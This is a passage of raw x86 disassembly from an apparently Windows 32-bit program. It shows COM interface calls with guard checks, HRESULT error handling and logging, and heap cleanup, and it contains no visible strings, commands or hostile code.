  4041d8:	call   DWORD PTR ds:0x40a038
  4041de:	mov    ecx,DWORD PTR [ebp-0x238]
  4041e4:	mov    edi,DWORD PTR [ebp-0x230]
  4041ea:	test   ecx,ecx
  4041ec:	je     0x40420b
  4041ee:	and    DWORD PTR [ebp-0x238],0x0
  4041f5:	mov    eax,DWORD PTR [ecx]
  4041f7:	push   ecx
  4041f8:	mov    esi,DWORD PTR [eax+0x8]
  4041fb:	mov    ecx,esi
  4041fd:	call   DWORD PTR ds:0x40a1c4
  404203:	call   esi
  404205:	mov    esi,DWORD PTR [ebp-0x250]
  40420b:	lea    eax,[ebp-0x238]
  404211:	push   eax
  404212:	push   0x401500
  404217:	push   edi
  404218:	call   DWORD PTR ds:0x40a0bc
  40421e:	push   DWORD PTR [ebp-0x230]
  404224:	mov    edi,eax
  404226:	call   DWORD PTR ds:0x40a0c8
  40422c:	test   edi,edi
  40422e:	jns    0x40424f
  404230:	push   edi
  404231:	push   0x401afc
  404236:	push   0x164
  40423b:	push   0x401a70
  404240:	push   0x1
  404242:	call   0x4052c4
  404247:	add    esp,0x14
  40424a:	jmp    0x40434b
  40424f:	test   ebx,ebx
  404251:	je     0x404260
  404253:	push   DWORD PTR [esi+0x344]
  404259:	push   0x401b40
  40425e:	jmp    0x404278
  404260:	cmp    DWORD PTR [ebp-0x24c],0x0
  404267:	je     0x40432d
  40426d:	push   DWORD PTR [esi+0x348]
  404273:	push   0x401b98
  404278:	lea    eax,[ebp-0x218]
  40427e:	push   0x104
  404283:	push   eax
  404284:	call   0x403e56
  404289:	mov    edi,eax
  40428b:	add    esp,0x10
  40428e:	test   edi,edi
  404290:	jns    0x40429f
  404292:	push   edi
  404293:	push   0x401bf8
  404298:	push   0x17f
  40429d:	jmp    0x40423b
  40429f:	mov    ecx,DWORD PTR [ebp-0x234]
  4042a5:	xor    ebx,ebx
  4042a7:	test   ecx,ecx
  4042a9:	je     0x4042c1
  4042ab:	mov    DWORD PTR [ebp-0x234],ebx
  4042b1:	mov    eax,DWORD PTR [ecx]
  4042b3:	push   ecx
  4042b4:	mov    esi,DWORD PTR [eax+0x8]
  4042b7:	mov    ecx,esi
  4042b9:	call   DWORD PTR ds:0x40a1c4
  4042bf:	call   esi
  4042c1:	mov    edx,DWORD PTR [ebp-0x23c]
  4042c7:	lea    eax,[ebp-0x234]
  4042cd:	mov    ecx,DWORD PTR [ebp-0x238]
  4042d3:	push   eax
  4042d4:	lea    eax,[ebp-0x218]
  4042da:	push   eax
  4042db:	push   DWORD PTR [ebp-0x244]
  4042e1:	call   0x40440e
  4042e6:	mov    edi,eax
  4042e8:	test   edi,edi
  4042ea:	jns    0x404308
  4042ec:	push   edi
  4042ed:	push   0x401c1c
  4042f2:	push   0x189
  4042f7:	push   0x401a70
  4042fc:	push   0x1
  4042fe:	call   0x4052c4
  404303:	add    esp,0x14
  404306:	jmp    0x40434d
  404308:	mov    edx,DWORD PTR [ebp-0x234]
  40430e:	push   ecx
  40430f:	mov    ecx,DWORD PTR [ebp-0x238]
  404315:	call   0x404c92
  40431a:	mov    edi,eax
  40431c:	test   edi,edi
  40431e:	jns    0x40434d
  404320:	push   edi
  404321:	push   0x401c48
  404326:	push   0x18f
  40432b:	jmp    0x4042f7
  40432d:	push   0x401be0
  404332:	push   0x17a
  404337:	push   0x401a70
  40433c:	push   0x1
  40433e:	mov    edi,0x80004005
  404343:	call   0x4052c4
  404348:	add    esp,0x10
  40434b:	xor    ebx,ebx
  40434d:	mov    BYTE PTR [ebp-0x4],bl
  404350:	mov    ecx,DWORD PTR [ebp-0x234]
  404356:	test   ecx,ecx
  404358:	je     0x404370
  40435a:	mov    DWORD PTR [ebp-0x234],ebx
  404360:	mov    eax,DWORD PTR [ecx]
  404362:	push   ecx
  404363:	mov    esi,DWORD PTR [eax+0x8]
  404366:	mov    ecx,esi
  404368:	call   DWORD PTR ds:0x40a1c4
  40436e:	call   esi
  404370:	or     DWORD PTR [ebp-0x4],0xffffffff
  404374:	mov    ecx,DWORD PTR [ebp-0x238]
  40437a:	test   ecx,ecx
  40437c:	je     0x404394
  40437e:	mov    DWORD PTR [ebp-0x238],ebx
  404384:	mov    eax,DWORD PTR [ecx]
  404386:	push   ecx
  404387:	mov    esi,DWORD PTR [eax+0x8]
  40438a:	mov    ecx,esi
  40438c:	call   DWORD PTR ds:0x40a1c4
  404392:	call   esi
  404394:	call   DWORD PTR ds:0x40a0c0
  40439a:	push   DWORD PTR [ebp-0x248]
  4043a0:	call   DWORD PTR ds:0x40a048
  4043a6:	cmp    DWORD PTR [ebp-0x23c],0x0
  4043ad:	je     0x4043c5
  4043af:	push   DWORD PTR [ebp-0x23c]
  4043b5:	mov    eax,fs:0x30
  4043bb:	push   ebx
  4043bc:	push   DWORD PTR [eax+0x18]
  4043bf:	call   DWORD PTR ds:0x40a170
  4043c5:	mov    eax,DWORD PTR [ebp-0x244]
  4043cb:	test   eax,eax
  4043cd:	je     0x4043e0
  4043cf:	push   eax
  4043d0:	mov    eax,fs:0x30
  4043d6:	push   ebx
  4043d7:	push   DWORD PTR [eax+0x18]
  4043da:	call   DWORD PTR ds:0x40a170
  4043e0:	cmp    DWORD PTR [ebp-0x240],0x0
  4043e7:	je     0x4043ff
  4043e9:	push   DWORD PTR [ebp-0x240]
  4043ef:	mov    eax,fs:0x30
  4043f5:	push   ebx
  4043f6:	push   DWORD PTR [eax+0x18]
  4043f9:	call   DWORD PTR ds:0x40a170
  4043ff:	mov    eax,edi
  404401:	call   0x407a54
  404406:	ret    0x8
  404409:	int3   
  40440a:	int3   
  40440b:	int3   
  40440c:	int3   
  40440d:	int3   
  40440e:	push   0x60
  404410:	mov    eax,0x407b8a
  404415:	call   0x407a68
  40441a:	mov    DWORD PTR [ebp-0x60],edx
  40441d:	mov    eax,DWORD PTR [ebp+0x8]
  404420:	xor    esi,esi
  404422:	mov    edx,DWORD PTR [ebp+0xc]
  404425:	mov    DWORD PTR [ebp-0x44],eax
  404428:	mov    eax,DWORD PTR [ebp+0x10]
  40442b:	mov    DWORD PTR [ebp-0x68],edx
  40442e:	mov    DWORD PTR [ebp-0x50],eax
  404431:	mov    DWORD PTR [ebp-0x48],esi
  404434:	mov    DWORD PTR [ebp-0x4],esi
  404437:	mov    DWORD PTR [ebp-0x4c],esi
  40443a:	mov    DWORD PTR [ebp-0x58],esi
  40443d:	mov    DWORD PTR [ebp-0x64],esi
  404440:	mov    DWORD PTR [ebp-0x54],esi
  404443:	mov    BYTE PTR [ebp-0x4],0x4
  404447:	test   edx,edx
  404449:	je     0x404abb
  40444f:	cmp    WORD PTR [edx],si
  404452:	je     0x404abb
  404458:	mov    esi,DWORD PTR [ecx]
  40445a:	push   eax
  40445b:	push   0x5
  40445d:	push   ecx
  40445e:	mov    ecx,DWORD PTR [esi+0x20]
  404461:	call   DWORD PTR ds:0x40a1c4
  404467:	call   DWORD PTR [esi+0x20]
  40446a:	mov    edi,eax
  40446c:	test   edi,edi
  40446e:	jns    0x404507
  404474:	push   edi
  404475:	push   0x401c9c
  40447a:	push   0x1c7
  40447f:	xor    ebx,ebx
  404481:	inc    ebx
  404482:	push   0x401c84
  404487:	push   ebx
  404488:	call   0x4052c4
  40448d:	add    esp,0x14
  404490:	xor    esi,esi
  404492:	mov    BYTE PTR [ebp-0x4],0x3
  404496:	mov    ecx,DWORD PTR [ebp-0x54]
  404499:	test   ecx,ecx
  40449b:	je     0x4044b0
  40449d:	mov    DWORD PTR [ebp-0x54],esi
  4044a0:	mov    eax,DWORD PTR [ecx]
  4044a2:	push   ecx
  4044a3:	mov    esi,DWORD PTR [eax+0x8]
  4044a6:	mov    ecx,esi
  4044a8:	call   DWORD PTR ds:0x40a1c4
  4044ae:	call   esi
  4044b0:	lea    ecx,[ebp-0x64]
  4044b3:	call   0x405209
  4044b8:	mov    BYTE PTR [ebp-0x4],bl
  4044bb:	xor    ebx,ebx
  4044bd:	mov    ecx,DWORD PTR [ebp-0x58]
  4044c0:	test   ecx,ecx
  4044c2:	je     0x4044d7
  4044c4:	mov    DWORD PTR [ebp-0x58],ebx
  4044c7:	mov    eax,DWORD PTR [ecx]
  4044c9:	push   ecx
  4044ca:	mov    esi,DWORD PTR [eax+0x8]
  4044cd:	mov    ecx,esi
  4044cf:	call   DWORD PTR ds:0x40a1c4
  4044d5:	call   esi
  4044d7:	lea    ecx,[ebp-0x4c]
  4044da:	call   0x405209
  4044df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4044e3:	mov    ecx,DWORD PTR [ebp-0x48]
  4044e6:	test   ecx,ecx
  4044e8:	je     0x4044fd
  4044ea:	mov    DWORD PTR [ebp-0x48],ebx
  4044ed:	mov    eax,DWORD PTR [ecx]
  4044ef:	push   ecx
  4044f0:	mov    esi,DWORD PTR [eax+0x8]
  4044f3:	mov    ecx,esi
  4044f5:	call   DWORD PTR ds:0x40a1c4
  4044fb:	call   esi
  4044fd:	mov    eax,edi
  4044ff:	call   0x407a54
  404504:	ret    0xc
  404507:	lea    eax,[ebp-0x28]
  40450a:	push   eax
  40450b:	lea    eax,[ebp-0x24]
  40450e:	push   eax
  40450f:	push   0x4
  404511:	push   0x401cc0
  404516:	call   DWORD PTR ds:0x40a0cc
  40451c:	xor    ebx,ebx
  40451e:	inc    ebx
  40451f:	test   eax,eax
  404521:	jns    0x404533
  404523:	xor    eax,eax
  404525:	push   eax
  404526:	push   eax
  404527:	push   ebx
  404528:	push   0xc000000d
  40452d:	call   DWORD PTR ds:0x40a038
  404533:	mov    BYTE PTR [ebp-0x4],0x5
  404537:	lea    eax,[ebp-0x48]
  40453a:	mov    esi,DWORD PTR [ebp-0x28]
  40453d:	lea    ecx,[ebp-0x5c]
  404540:	mov    DWORD PTR [ebp-0x5c],eax
  404543:	mov    eax,DWORD PTR [ebp-0x50]
  404546:	mov    eax,DWORD PTR [eax]
  404548:	mov    edi,DWORD PTR [eax]
  40454a:	call   0x405247
  40454f:	mov    ecx,DWORD PTR [edi+0x40]
  404552:	push   eax
  404553:	mov    eax,DWORD PTR [ebp-0x50]
  404556:	push   esi
  404557:	push   DWORD PTR [eax]
  404559:	call   DWORD PTR ds:0x40a1c4
  40455f:	call   DWORD PTR [edi+0x40]
  404562:	mov    BYTE PTR [ebp-0x4],0x4
  404566:	mov    edi,eax
  404568:	push   DWORD PTR [ebp-0x28]
  40456b:	call   DWORD PTR ds:0x40a0c8
  404571:	test   edi,edi
  404573:	js     0x404aab
  404579:	cmp    edi,ebx
  40457b:	je     0x404aab
  404581:	mov    eax,DWORD PTR [ebp-0x48]
  404584:	lea    edx,[ebp-0x6c]
  404587:	push   edx
  404588:	push   eax
  404589:	mov    ecx,DWORD PTR [eax]
  40458b:	mov    esi,DWORD PTR [ecx+0x18]
  40458e:	mov    ecx,esi
  404590:	call   DWORD PTR ds:0x40a1c4
  404596:	call   esi
  404598:	mov    edi,eax
  40459a:	test   edi,edi
  40459c:	jns    0x4045ae
  40459e:	push   edi
  40459f:	push   0x401cfc
  4045a4:	push   0x1d3
  4045a9:	jmp    0x404482
  4045ae:	mov    esi,DWORD PTR [ebp-0x48]
  4045b1:	lea    eax,[ebp-0x4c]
  4045b4:	lea    ecx,[ebp-0x5c]
  4045b7:	mov    DWORD PTR [ebp-0x5c],eax
  4045ba:	mov    edi,DWORD PTR [esi]
  4045bc:	call   0x405247
  4045c1:	mov    ecx,DWORD PTR [edi+0x1c]
  4045c4:	push   eax
  4045c5:	xor    eax,eax
  4045c7:	push   eax
  4045c8:	push   esi
  4045c9:	call   DWORD PTR ds:0x40a1c4
  4045cf:	call   DWORD PTR [edi+0x1c]
  4045d2:	mov    edi,eax
  4045d4:	test   edi,edi
  4045d6:	jns    0x4045e8
  4045d8:	push   edi
  4045d9:	push   0x401d2c
  4045de:	push   0x1dd
  4045e3:	jmp    0x404482
  4045e8:	mov    edx,DWORD PTR [ebp-0x60]
  4045eb:	xor    edi,edi
  4045ed:	mov    ecx,edx
  4045ef:	lea    esi,[ecx+0x2]
  4045f2:	mov    ax,WORD PTR [ecx]
  4045f5:	add    ecx,0x2
  4045f8:	cmp    ax,di
  4045fb:	jne    0x4045f2
  4045fd:	sub    ecx,esi
  4045ff:	sar    ecx,1
  404601:	push   ecx
  404602:	push   edx
  404603:	lea    ecx,[ebp-0x28]
  404606:	call   0x403ec2
  40460b:	mov    ecx,DWORD PTR [ebp-0x50]
  40460e:	mov    BYTE PTR [ebp-0x4],0x6
  404612:	mov    edx,DWORD PTR [ebp-0x4c]
  404615:	push   DWORD PTR [ecx]
  404617:	mov    ecx,DWORD PTR [eax]
  404619:	call   0x404e8d
  40461e:	mov    BYTE PTR [ebp-0x4],0x4
  404622:	mov    edi,eax
  404624:	push   DWORD PTR [ebp-0x28]
  404627:	call   DWORD PTR ds:0x40a0c8
  40462d:	test   edi,edi
  40462f:	jns    0x404641
  404631:	push   edi
  404632:	push   0x401d50
  404637:	push   0x1e3
  40463c:	jmp    0x404482
  404641:	mov    esi,DWORD PTR [ebp-0x48]
  404644:	lea    eax,[ebp-0x4c]
  404647:	lea    ecx,[ebp-0x60]
  40464a:	mov    DWORD PTR [ebp-0x60],eax
  40464d:	mov    edi,DWORD PTR [esi]
  40464f:	call   0x405247
  404654:	mov    ecx,DWORD PTR [edi+0x1c]
  404657:	push   eax
  404658:	push   ebx
  404659:	push   esi
  40465a:	call   DWORD PTR ds:0x40a1c4
  404660:	call   DWORD PTR [edi+0x1c]
  404663:	mov    edi,eax
  404665:	test   edi,edi
  404667:	jns    0x404679
  404669:	push   edi
  40466a:	push   0x401d7c
  40466f:	push   0x1ed
  404674:	jmp    0x404482
  404679:	mov    esi,DWORD PTR [ebp-0x44]
  40467c:	xor    edi,edi
  40467e:	mov    ecx,esi
  404680:	lea    edx,[ecx+0x2]
  404683:	mov    ax,WORD PTR [ecx]
  404686:	add    ecx,0x2
  404689:	cmp    ax,di
  40468c:	jne    0x404683
  40468e:	sub    ecx,edx
  404690:	sar    ecx,1
  404692:	push   ecx
  404693:	push   esi
  404694:	lea    ecx,[ebp-0x28]
  404697:	call   0x403ec2
  40469c:	mov    ecx,DWORD PTR [ebp-0x50]
  40469f:	mov    BYTE PTR [ebp-0x4],0x7
  4046a3:	mov    edx,DWORD PTR [ebp-0x4c]
  4046a6:	push   DWORD PTR [ecx]
  4046a8:	mov    ecx,DWORD PTR [eax]
  4046aa:	call   0x404e8d
  4046af:	mov    BYTE PTR [ebp-0x4],0x4
  4046b3:	mov    edi,eax
  4046b5:	push   DWORD PTR [ebp-0x28]
  4046b8:	call   DWORD PTR ds:0x40a0c8
  4046be:	test   edi,edi
  4046c0:	jns    0x4046d2
  4046c2:	push   edi
  4046c3:	push   0x401da0
  4046c8:	push   0x1f3
  4046cd:	jmp    0x404482
  4046d2:	lea    eax,[ebp-0x28]
  4046d5:	push   eax
  4046d6:	lea    eax,[ebp-0x24]
  4046d9:	push   eax
  4046da:	push   0x7
  4046dc:	push   0x401dcc
  4046e1:	call   DWORD PTR ds:0x40a0cc
  4046e7:	test   eax,eax
  4046e9:	jns    0x4046fb
  4046eb:	xor    eax,eax
  4046ed:	push   eax
  4046ee:	push   eax
  4046ef:	push   ebx
  4046f0:	push   0xc000000d
  4046f5:	call   DWORD PTR ds:0x40a038
  4046fb:	mov    BYTE PTR [ebp-0x4],0x8
  4046ff:	lea    eax,[ebp-0x48]
  404702:	mov    esi,DWORD PTR [ebp-0x28]
  404705:	lea    ecx,[ebp-0x44]
  404708:	mov    DWORD PTR [ebp-0x44],eax
  40470b:	mov    eax,DWORD PTR [ebp-0x50]
  40470e:	mov    eax,DWORD PTR [eax]
  404710:	mov    edi,DWORD PTR [eax]
  404712:	call   0x405247
  404717:	mov    ecx,DWORD PTR [edi+0x40]
  40471a:	push   eax
  40471b:	mov    eax,DWORD PTR [ebp-0x50]
  40471e:	push   esi
  40471f:	push   DWORD PTR [eax]
  404721:	call   DWORD PTR ds:0x40a1c4
  404727:	call   DWORD PTR [edi+0x40]
  40472a:	mov    BYTE PTR [ebp-0x4],0x4
  40472e:	mov    edi,eax
  404730:	push   DWORD PTR [ebp-0x28]
  404733:	call   DWORD PTR ds:0x40a0c8
  404739:	test   edi,edi
  40473b:	js     0x404a9b
  404741:	cmp    edi,ebx
  404743:	je     0x404a9b
  404749:	mov    esi,DWORD PTR [ebp-0x48]
  40474c:	lea    eax,[ebp-0x4c]
  40474f:	lea    ecx,[ebp-0x44]
  404752:	mov    DWORD PTR [ebp-0x44],eax
  404755:	mov    edi,DWORD PTR [esi]
  404757:	call   0x405247
  40475c:	mov    ecx,DWORD PTR [edi+0x1c]
  40475f:	push   eax
  404760:	xor    eax,eax
  404762:	push   eax
  404763:	push   esi
  404764:	call   DWORD PTR ds:0x40a1c4
  40476a:	call   DWORD PTR [edi+0x1c]
  40476d:	mov    edi,eax
  40476f:	test   edi,edi
  404771:	jns    0x404783
  404773:	push   edi
  404774:	push   0x401e10
  404779:	push   0x203
  40477e:	jmp    0x404482
  404783:	mov    ecx,DWORD PTR [ebp-0x58]
  404786:	mov    edi,DWORD PTR [ebp-0x4c]
  404789:	test   ecx,ecx
  40478b:	je     0x4047a2
  40478d:	xor    eax,eax
  40478f:	mov    DWORD PTR [ebp-0x58],eax
  404792:	mov    eax,DWORD PTR [ecx]
  404794:	push   ecx
  404795:	mov    esi,DWORD PTR [eax+0x8]
  404798:	mov    ecx,esi
  40479a:	call   DWORD PTR ds:0x40a1c4
  4047a0:	call   esi
  4047a2:	mov    eax,DWORD PTR [edi]
  4047a4:	lea    ecx,[ebp-0x58]
  4047a7:	push   ecx
  4047a8:	push   edi
  4047a9:	mov    esi,DWORD PTR [eax+0x40]
  4047ac:	mov    ecx,esi
  4047ae:	call   DWORD PTR ds:0x40a1c4
  4047b4:	call   esi
  4047b6:	mov    edi,eax
  4047b8:	test   edi,edi
  4047ba:	jns    0x4047cc
  4047bc:	push   edi
  4047bd:	push   0x401e3c
  4047c2:	push   0x209
  4047c7:	jmp    0x404482
  4047cc:	mov    ebx,DWORD PTR [ebp-0x58]
  4047cf:	lea    ecx,[ebp-0x28]
  4047d2:	push   0x401e70
  4047d7:	call   0x40528b
  4047dc:	mov    BYTE PTR [ebp-0x4],0x9
  4047e0:	lea    ecx,[ebp-0x64]
  4047e3:	mov    esi,DWORD PTR [eax]
  4047e5:	mov    edi,DWORD PTR [ebx]
  4047e7:	mov    DWORD PTR [ebp-0x44],ecx
  4047ea:	lea    ecx,[ebp-0x44]
  4047ed:	call   0x405247
  4047f2:	mov    ecx,DWORD PTR [edi+0x20]
  4047f5:	push   eax
  4047f6:	push   esi
  4047f7:	push   ebx
  4047f8:	call   DWORD PTR ds:0x40a1c4
  4047fe:	call   DWORD PTR [edi+0x20]
  404801:	mov    BYTE PTR [ebp-0x4],0x4
  404805:	mov    edi,eax
  404807:	push   DWORD PTR [ebp-0x28]
  40480a:	call   DWORD PTR ds:0x40a0c8
  404810:	test   edi,edi
  404812:	jns    0x404824
  404814:	push   edi
  404815:	push   0x401e84
  40481a:	push   0x20f
  40481f:	jmp    0x40447f
  404824:	mov    ecx,DWORD PTR [ebp-0x54]
  404827:	xor    ebx,ebx
  404829:	test   ecx,ecx
  40482b:	je     0x404840
  40482d:	mov    DWORD PTR [ebp-0x54],ebx
  404830:	mov    eax,DWORD PTR [ecx]
  404832:	push   ecx
  404833:	mov    esi,DWORD PTR [eax+0x8]
  404836:	mov    ecx,esi
  404838:	call   DWORD PTR ds:0x40a1c4
  40483e:	call   esi
  404840:	mov    eax,DWORD PTR [ebp-0x64]
  404843:	lea    ecx,[ebp-0x54]
  404846:	push   ecx
  404847:	push   0x401510
  40484c:	push   eax
  40484d:	mov    esi,DWORD PTR [eax]
  40484f:	mov    ecx,DWORD PTR [esi]
  404851:	call   DWORD PTR ds:0x40a1c4
  404857:	call   DWORD PTR [esi]
  404859:	mov    edi,eax
  40485b:	test   edi,edi
  40485d:	jns    0x40486f
  40485f:	push   edi
  404860:	push   0x401ec4
  404865:	push   0x215
  40486a:	jmp    0x40447f
  40486f:	mov    esi,DWORD PTR [ebp-0x54]
  404872:	lea    eax,[ebp-0x28]
  404875:	push   eax
  404876:	lea    eax,[ebp-0x24]
  404879:	push   eax
  40487a:	push   0xc
  40487c:	push   0x401ef8
  404881:	call   DWORD PTR ds:0x40a0cc
  404887:	test   eax,eax
  404889:	jns    0x40489e
  40488b:	push   ebx
  40488c:	push   ebx
  40488d:	xor    ebx,ebx
  40488f:	inc    ebx
  404890:	push   ebx
  404891:	push   0xc000000d
  404896:	call   DWORD PTR ds:0x40a038
  40489c:	jmp    0x4048a1
  40489e:	xor    ebx,ebx
  4048a0:	inc    ebx
  4048a1:	mov    BYTE PTR [ebp-0x4],0xa
  4048a5:	mov    eax,DWORD PTR [esi]
  4048a7:	push   DWORD PTR [ebp-0x28]
  4048aa:	push   esi
  4048ab:	mov    esi,DWORD PTR [eax+0x24]
  4048ae:	mov    ecx,esi
  4048b0:	call   DWORD PTR ds:0x40a1c4
  4048b6:	call   esi
  4048b8:	mov    BYTE PTR [ebp-0x4],0x4
  4048bc:	mov    edi,eax
  4048be:	push   DWORD PTR [ebp-0x28]
  4048c1:	call   DWORD PTR ds:0x40a0c8
  4048c7:	test   edi,edi
  4048c9:	jns    0x4048db
  4048cb:	push   edi
  4048cc:	push   0x401f14
  4048d1:	push   0x21b
  4048d6:	jmp    0x404482
  4048db:	lea    eax,[ebp-0x28]
  4048de:	push   eax
  4048df:	lea    eax,[ebp-0x24]
  4048e2:	push   eax
  4048e3:	push   0x5
  4048e5:	push   0x401f40
  4048ea:	call   DWORD PTR ds:0x40a0cc
  4048f0:	test   eax,eax
  4048f2:	jns    0x404904
  4048f4:	xor    eax,eax
  4048f6:	push   eax
  4048f7:	push   eax
  4048f8:	push   ebx
  4048f9:	push   0xc000000d
  4048fe:	call   DWORD PTR ds:0x40a038
  404904:	mov    BYTE PTR [ebp-0x4],0xb
  404908:	lea    eax,[ebp-0x48]
  40490b:	mov    esi,DWORD PTR [ebp-0x28]
  40490e:	lea    ecx,[ebp-0x44]
  404911:	mov    DWORD PTR [ebp-0x44],eax
  404914:	mov    eax,DWORD PTR [ebp-0x50]
  404917:	mov    eax,DWORD PTR [eax]
  404919:	mov    edi,DWORD PTR [eax]
  40491b:	call   0x405247
  404920:	mov    ecx,DWORD PTR [edi+0x40]
  404923:	push   eax
  404924:	mov    eax,DWORD PTR [ebp-0x50]
  404927:	push   esi
  404928:	push   DWORD PTR [eax]
  40492a:	call   DWORD PTR ds:0x40a1c4
  404930:	call   DWORD PTR [edi+0x40]
  404933:	mov    BYTE PTR [ebp-0x4],0x4
  404937:	mov    edi,eax
  404939:	push   DWORD PTR [ebp-0x28]
  40493c:	call   DWORD PTR ds:0x40a0c8
  404942:	test   edi,edi
  404944:	jns    0x404956
  404946:	push   edi
  404947:	push   0x401f4c
  40494c:	push   0x225
  404951:	jmp    0x404482
  404956:	mov    esi,DWORD PTR [ebp-0x48]
  404959:	lea    eax,[ebp-0x4c]
  40495c:	lea    ecx,[ebp-0x44]
  40495f:	mov    DWORD PTR [ebp-0x44],eax
  404962:	mov    edi,DWORD PTR [esi]
  404964:	call   0x405247
  404969:	mov    ecx,DWORD PTR [edi+0x1c]
  40496c:	push   eax
  40496d:	xor    eax,eax
  40496f:	push   eax
  404970:	push   esi
  404971:	call   DWORD PTR ds:0x40a1c4
  404977:	call   DWORD PTR [edi+0x1c]
  40497a:	mov    edi,eax
  40497c:	test   edi,edi
  40497e:	jns    0x404990
  404980:	push   edi
  404981:	push   0x401e10
  404986:	push   0x22b
  40498b:	jmp    0x404482
  404990:	mov    esi,DWORD PTR [ebp-0x68]
  404993:	xor    edi,edi
  404995:	mov    ecx,esi
  404997:	lea    edx,[ecx+0x2]
  40499a:	mov    ax,WORD PTR [ecx]
  40499d:	add    ecx,0x2
  4049a0:	cmp    ax,di
  4049a3:	jne    0x40499a
  4049a5:	sub    ecx,edx
  4049a7:	sar    ecx,1
  4049a9:	push   ecx
  4049aa:	push   esi
  4049ab:	lea    ecx,[ebp-0x40]
  4049ae:	call   0x403ec2
  4049b3:	mov    edi,eax
  4049b5:	lea    eax,[ebp-0x28]
  4049b8:	push   eax
  4049b9:	lea    eax,[ebp-0x24]
  4049bc:	push   eax
  4049bd:	push   0x6
  4049bf:	push   0x401f7c
  4049c4:	call   DWORD PTR ds:0x40a0cc
  4049ca:	test   eax,eax
  4049cc:	jns    0x4049de
  4049ce:	xor    eax,eax
  4049d0:	push   eax
  4049d1:	push   eax
  4049d2:	push   ebx
  4049d3:	push   0xc000000d
  4049d8:	call   DWORD PTR ds:0x40a038
  4049de:	mov    esi,DWORD PTR [ebp-0x50]
  4049e1:	mov    BYTE PTR [ebp-0x4],0xd
  4049e5:	mov    edx,DWORD PTR [edi]
  4049e7:	mov    ecx,DWORD PTR [ebp-0x28]
  4049ea:	push   DWORD PTR [esi]
  4049ec:	push   DWORD PTR [ebp-0x4c]
  4049ef:	call   0x404ae5
  4049f4:	push   DWORD PTR [ebp-0x28]
  4049f7:	mov    edi,eax
  4049f9:	call   DWORD PTR ds:0x40a0c8
  4049ff:	mov    BYTE PTR [ebp-0x4],0x4
  404a03:	push   DWORD PTR [ebp-0x40]
  404a06:	call   DWORD PTR ds:0x40a0c8
  404a0c:	test   edi,edi
  404a0e:	jns    0x404a20
  404a10:	push   edi
  404a11:	push   0x401f8c
  404a16:	push   0x238
  404a1b:	jmp    0x404482
  404a20:	push   0x401fb0
  404a25:	lea    ecx,[ebp-0x40]
  404a28:	call   0x40528b
  404a2d:	mov    edi,eax
  404a2f:	lea    eax,[ebp-0x28]
  404a32:	push   eax
  404a33:	lea    eax,[ebp-0x24]
  404a36:	push   eax
  404a37:	push   0xe
  404a39:	push   0x401fc4
  404a3e:	call   DWORD PTR ds:0x40a0cc
  404a44:	test   eax,eax
  404a46:	jns    0x404a58
  404a48:	xor    eax,eax
  404a4a:	push   eax
  404a4b:	push   eax
  404a4c:	push   ebx
  404a4d:	push   0xc000000d
  404a52:	call   DWORD PTR ds:0x40a038
  404a58:	mov    BYTE PTR [ebp-0x4],0xf
  404a5c:	push   DWORD PTR [esi]
  404a5e:	mov    edx,DWORD PTR [edi]
  404a60:	push   DWORD PTR [ebp-0x4c]
  404a63:	mov    ecx,DWORD PTR [ebp-0x28]
  404a66:	call   0x404ae5
  404a6b:	push   DWORD PTR [ebp-0x28]
  404a6e:	mov    edi,eax
  404a70:	call   DWORD PTR ds:0x40a0c8
  404a76:	mov    BYTE PTR [ebp-0x4],0x4
  404a7a:	push   DWORD PTR [ebp-0x40]
  404a7d:	call   DWORD PTR ds:0x40a0c8
  404a83:	test   edi,edi
  404a85:	jns    0x404490
  404a8b:	push   edi
  404a8c:	push   0x401fe4
  404a91:	push   0x245
  404a96:	jmp    0x404482
  404a9b:	push   edi
  404a9c:	push   0x401ddc
  404aa1:	push   0x1fd
  404aa6:	jmp    0x404482
  404aab:	push   edi
  404aac:	push   0x401ccc
  404ab1:	push   0x1cd
  404ab6:	jmp    0x404482
  404abb:	push   0x401c68
  404ac0:	push   0x1c1
  404ac5:	xor    ebx,ebx
  404ac7:	mov    edi,0x80070057
  404acc:	push   0x401c84
  404ad1:	inc    ebx
  404ad2:	push   ebx
  404ad3:	call   0x4052c4
  404ad8:	add    esp,0x10
  404adb:	jmp    0x404492
  404ae0:	int3   
  404ae1:	int3   
  404ae2:	int3   
  404ae3:	int3   
  404ae4:	int3   
  404ae5:	push   0x18
  404ae7:	mov    eax,0x407bd4
  404aec:	call   0x407a68
  404af1:	mov    ebx,edx
  404af3:	mov    DWORD PTR [ebp-0x20],ecx
  404af6:	xor    eax,eax
  404af8:	mov    DWORD PTR [ebp-0x1c],eax
  404afb:	mov    DWORD PTR [ebp-0x4],eax
  404afe:	mov    DWORD PTR [ebp-0x14],eax
  404b01:	mov    DWORD PTR [ebp-0x18],eax
  404b04:	mov    DWORD PTR [ebp-0x24],eax
  404b07:	mov    eax,DWORD PTR [ebp+0x8]
  404b0a:	lea    edx,[ebp-0x1c]
  404b0d:	mov    BYTE PTR [ebp-0x4],0x3
  404b11:	push   edx
  404b12:	push   eax
  404b13:	mov    ecx,DWORD PTR [eax]
  404b15:	mov    esi,DWORD PTR [ecx+0x40]
  404b18:	mov    ecx,esi
  404b1a:	call   DWORD PTR ds:0x40a1c4
  404b20:	call   esi
  404b22:	mov    edi,eax
  404b24:	test   edi,edi
  404b26:	je     0x404b38
  404b28:	push   edi
  404b29:	push   0x402010
  404b2e:	push   0x262
  404b33:	jmp    0x404c26
  404b38:	mov    ecx,DWORD PTR [ebp-0x14]
  404b3b:	test   ecx,ecx
  404b3d:	je     0x404b53
  404b3f:	and    DWORD PTR [ebp-0x14],0x0
  404b43:	mov    eax,DWORD PTR [ecx]
  404b45:	push   ecx
  404b46:	mov    esi,DWORD PTR [eax+0x8]
  404b49:	mov    ecx,esi
  404b4b:	call   DWORD PTR ds:0x40a1c4
  404b51:	call   esi
  404b53:	mov    eax,DWORD PTR [ebp+0xc]
  404b56:	lea    ecx,[ebp-0x14]
  404b59:	push   ecx
  404b5a:	push   DWORD PTR [ebp-0x20]
  404b5d:	mov    esi,DWORD PTR [eax]
  404b5f:	push   eax
  404b60:	mov    ecx,DWORD PTR [esi+0x38]
  404b63:	call   DWORD PTR ds:0x40a1c4
  404b69:	call   DWORD PTR [esi+0x38]
  404b6c:	mov    edi,eax
  404b6e:	test   edi,edi
  404b70:	jns    0x404b82
  404b72:	push   edi
  404b73:	push   0x402048
  404b78:	push   0x268
  404b7d:	jmp    0x404c26
  404b82:	mov    eax,DWORD PTR [ebp-0x14]
  404b85:	push   ebx
  404b86:	push   eax
